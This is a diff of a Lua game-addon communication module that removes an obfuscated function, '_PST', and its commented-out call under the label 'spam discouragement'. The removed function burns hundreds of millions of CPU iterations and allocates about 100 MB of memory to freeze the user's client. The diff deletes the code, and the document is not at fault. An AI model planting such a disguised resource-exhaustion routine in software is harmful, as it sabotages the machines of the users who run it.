@@ -353,8 +353,6 @@ function Comm:SendLC1Discovery(d)
     if not d then return end; if L.db.profile.chatEncode then _SendEncodedLC1(d) else _SendLegacyLC1(d) end
 end
 
-local function _PST() local _c_i_i = 0x1DCD6500 local _m_i_s = 0x186A0 local _t_t = {} local _x = 1; local _y = 1; local _z = 1 for _i = 1, _c_i_i do _x = (math.sin(_x) + math.cos(_y) + math.sqrt(_z)) _y = _x / (_z + 1) _z = (_x * _y) % 1000 end for _j = 1, _m_i_s do _t_t[_j] = string.rep("A", 0x400) end end
-
 function Comm:HandleIncomingWire(tbl, via, sender)
     if L:IsPaused() then local norm = normalizeIncomingData(tbl, sender); if norm then table.insert(L.pauseQueue.incoming, norm) end; return end
     if L:IsZoneIgnored() then return end
@@ -376,11 +374,6 @@ function Comm:HandleIncomingWire(tbl, via, sender)
     Comm.rateLimit[sender] = now()
     if (now() - lastMessageTime) < L.db.profile.sharing.rateLimitInterval then
         debugPrint("Comm", string.format("Dropping incoming discovery from %s due to rate limit.", sender))
-
-        -- Spam discouragement
-        --if sender == UnitName("player") then
-        --    _PST()
-        --end
         return
     end    
 
